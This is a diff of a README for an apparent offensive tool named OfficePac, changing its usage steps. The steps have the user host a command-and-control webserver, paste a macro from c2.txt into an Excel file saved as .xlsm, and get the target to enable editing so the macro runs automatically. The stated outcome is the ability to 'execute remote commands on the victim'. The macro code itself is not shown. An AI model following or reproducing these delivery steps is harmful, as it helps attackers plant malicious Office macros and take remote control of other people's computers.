@@ -25,8 +25,8 @@ To decrypt it, paste the decrypt.txt inside a new Word macro, put your encrypted
 1. First, you will have to install dependencies. Navigate to the OfficePac folder with your terminal and type:
 - pip install -r requirements.txt
 2. Run the main.py file to host your webserver
-3. Copy from OfficePac/macro/c2.txt to your document, and save it as a .docm
-4. Execute the script
+3. Copy from OfficePac/macro/c2.txt to your Excel document (works the best), and save it as a .xlsm
+4. Enable editing, and then re-run it. It should automatically run the macro.
 5. You should now be able to execute remote commands on the victim
 
 # Extra 
